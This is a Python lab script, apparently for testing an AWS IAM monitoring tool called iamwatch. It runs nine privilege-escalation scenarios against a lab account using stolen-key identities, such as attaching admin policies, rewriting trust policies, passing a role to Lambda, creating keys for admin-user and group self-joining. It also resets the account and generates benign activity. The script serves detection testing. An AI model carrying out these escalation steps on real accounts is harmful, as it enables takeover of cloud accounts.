#!/usr/bin/env python3
"""Run the nine attack scenarios (s1-s5, x1-x4) against the lab account, and reset it afterwards.

    python lab/attacks.py run s1          # run one scenario once (s1..s5, x1..x4)
    python lab/attacks.py run all         # run all scenarios once (resets between them)
    python lab/attacks.py reset           # undo every attack
    python lab/attacks.py benign          # harmless admin activity (for false-alarm tests)

The scenarios use the stolen-key identities in lab/lab_credentials.json.  `reset` and `benign`
use your normal AWS credentials (the admin user you configured with `aws configure`).
"""
import argparse
import io
import json
import os
import sys
import time
import zipfile

import boto3
from botocore.exceptions import ClientError

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "src"))
from iamwatch import labspec as L  # noqa: E402

CRED_FILE = os.path.join(ROOT, "lab", "lab_credentials.json")
REGION = "us-east-1"


def account():
    return boto3.client("sts", region_name=REGION).get_caller_identity()["Account"]


def user_session(user):
    c = json.load(open(CRED_FILE))[user]
    return boto3.session.Session(aws_access_key_id=c["AccessKeyId"], aws_secret_access_key=c["SecretAccessKey"],
                                 region_name=REGION)


def retry(fn, tries=12, delay=5, retry_codes=("AccessDenied", "AccessDeniedException", "InvalidParameterValueException",
                                              "NoSuchEntity", "MalformedPolicyDocument")):
    """IAM is eventually consistent: retry on errors that usually mean 'not propagated yet'."""
    last = None
    for _ in range(tries):
        try:
            return fn()
        except ClientError as e:
            last = e
            if e.response["Error"]["Code"] not in retry_codes:
                raise
            time.sleep(delay)
    raise last


def s1(acct):
    sts = user_session("dev-user").client("sts")
    cred = retry(lambda: sts.assume_role(RoleArn=L.role_arn(acct, "eks-worker-role"),
                                         RoleSessionName="iamwatch-attack")["Credentials"])
    iam = boto3.client("iam", aws_access_key_id=cred["AccessKeyId"], aws_secret_access_key=cred["SecretAccessKey"],
                       aws_session_token=cred["SessionToken"], region_name=REGION)
    time.sleep(2)
    retry(lambda: iam.attach_role_policy(RoleName="eks-worker-role", PolicyArn=L.ADMIN_POLICY_ARN))


def s2(acct):
    iam = user_session("ci-user").client("iam")
    retry(lambda: iam.create_policy_version(PolicyArn=L.ci_policy_arn(acct), PolicyDocument=json.dumps(L.ADMIN_DOC),
                                            SetAsDefault=True))


def s3(acct):
    sess = user_session("ops-user")
    iam, sts = sess.client("iam"), sess.client("sts")
    trust = {"Version": "2012-10-17", "Statement": [
        {"Effect": "Allow", "Principal": {"AWS": ["arn:aws:iam::%s:root" % acct, L.user_arn(acct, "ops-user")]},
         "Action": "sts:AssumeRole"}]}
    retry(lambda: iam.update_assume_role_policy(RoleName="admin-role", PolicyDocument=json.dumps(trust)))
    time.sleep(8)
    retry(lambda: sts.assume_role(RoleArn=L.role_arn(acct, "admin-role"), RoleSessionName="iamwatch-attack"))


def s4(acct):
    lam = user_session("deploy-user").client("lambda")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("index.py", "def handler(event, context):\n    return 'ok'\n")
    retry(lambda: lam.create_function(FunctionName="iamwatch-lab-fn", Runtime="python3.12",
                                      Role=L.role_arn(acct, "lambda-target-role"), Handler="index.handler",
                                      Code={"ZipFile": buf.getvalue()}))


def s5(acct):
    iam = user_session("helpdesk-user").client("iam")
    retry(lambda: iam.create_access_key(UserName="admin-user"))


def x1(acct):
    """chain-user -> stage-role -> prod-admin-role: every single step looks like a routine AssumeRole."""
    sts = user_session("chain-user").client("sts")
    c1 = retry(lambda: sts.assume_role(RoleArn=L.role_arn(acct, "stage-role"), RoleSessionName="iamwatch-x1a")["Credentials"])
    sts2 = boto3.client("sts", aws_access_key_id=c1["AccessKeyId"], aws_secret_access_key=c1["SecretAccessKey"],
                        aws_session_token=c1["SessionToken"], region_name=REGION)
    time.sleep(2)
    retry(lambda: sts2.assume_role(RoleArn=L.role_arn(acct, "prod-admin-role"), RoleSessionName="iamwatch-x1b"))


def x2(acct):
    iam = user_session("joiner-user").client("iam")
    retry(lambda: iam.add_user_to_group(GroupName="admins-group", UserName="joiner-user"))


def x3(acct):
    iam = user_session("selfput-user").client("iam")
    retry(lambda: iam.put_user_policy(UserName="selfput-user", PolicyName="x", PolicyDocument=json.dumps(L.ADMIN_DOC)))


def x4(acct):
    iam = user_session("rollback-user").client("iam")
    retry(lambda: iam.set_default_policy_version(PolicyArn=L.rollback_policy_arn(acct), VersionId="v1"))


SCENARIO_FUNCS = {"s1": s1, "s2": s2, "s3": s3, "s4": s4, "s5": s5, "x1": x1, "x2": x2, "x3": x3, "x4": x4}


def quiet(fn, *a, **kw):
    try:
        return fn(*a, **kw)
    except ClientError:
        return None


def reset(acct):
    iam = boto3.client("iam", region_name=REGION)
    quiet(iam.detach_role_policy, RoleName="eks-worker-role", PolicyArn=L.ADMIN_POLICY_ARN)
    arn = L.ci_policy_arn(acct)
    versions = quiet(iam.list_policy_versions, PolicyArn=arn) or {"Versions": []}
    keep = sorted(versions["Versions"], key=lambda v: int(v["VersionId"][1:]))
    if keep:
        quiet(iam.set_default_policy_version, PolicyArn=arn, VersionId=keep[0]["VersionId"])
        for v in keep[1:]:
            quiet(iam.delete_policy_version, PolicyArn=arn, VersionId=v["VersionId"])
    quiet(iam.update_assume_role_policy, RoleName="admin-role", PolicyDocument=json.dumps(L.trust_root(acct)))
    quiet(boto3.client("lambda", region_name=REGION).delete_function, FunctionName="iamwatch-lab-fn")
    for k in (quiet(iam.list_access_keys, UserName="admin-user") or {}).get("AccessKeyMetadata", []):
        quiet(iam.delete_access_key, UserName="admin-user", AccessKeyId=k["AccessKeyId"])
    # x2 / x3 / x4
    quiet(iam.remove_user_from_group, GroupName="admins-group", UserName="joiner-user")
    quiet(iam.delete_user_policy, UserName="selfput-user", PolicyName="x")
    quiet(iam.set_default_policy_version, PolicyArn=L.rollback_policy_arn(acct), VersionId="v2")


def benign(acct):
    """Harmless activity: create a throw-away role, attach read-only access, assume read-only roles.
    (a longer, randomised version for the false-alert experiment is lab/benign_load.py)"""
    iam = boto3.client("iam", region_name=REGION)
    quiet(iam.create_role, RoleName="iamwatch-tmp-role",
          AssumeRolePolicyDocument=json.dumps(L.trust_service("ec2.amazonaws.com")))
    quiet(iam.attach_role_policy, RoleName="iamwatch-tmp-role", PolicyArn=L.READONLY_POLICY_ARN)
    time.sleep(1)
    quiet(iam.detach_role_policy, RoleName="iamwatch-tmp-role", PolicyArn=L.READONLY_POLICY_ARN)
    quiet(iam.delete_role, RoleName="iamwatch-tmp-role")
    sts = user_session("dev-user").client("sts")      # a developer legitimately using a read-only role
    quiet(sts.assume_role, RoleArn=L.role_arn(acct, "readonly-role"), RoleSessionName="dev-daily")


def run(kind, acct, wait=0):
    """Run one scenario once and return a timing record."""
    t0 = time.time()
    SCENARIO_FUNCS[kind](acct)
    return {"scenario": kind, "attack_start_epoch": t0, "attack_end_epoch": time.time(),
            "title": L.SCENARIO_TITLE[kind]}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("action", choices=["run", "reset", "benign"])
    ap.add_argument("scenario", nargs="?", default="all", help="s1..s5, x1..x4 or all")
    args = ap.parse_args()
    acct = account()
    if args.action == "reset":
        reset(acct)
        print("lab reset")
    elif args.action == "benign":
        benign(acct)
        print("benign activity done")
    else:
        kinds = L.LIVE_SCENARIOS if args.scenario == "all" else [args.scenario]
        for k in kinds:
            reset(acct)
            time.sleep(10)
            rec = run(k, acct)
            print(json.dumps(rec))
            time.sleep(3)
        reset(acct)


if __name__ == "__main__":
    main()
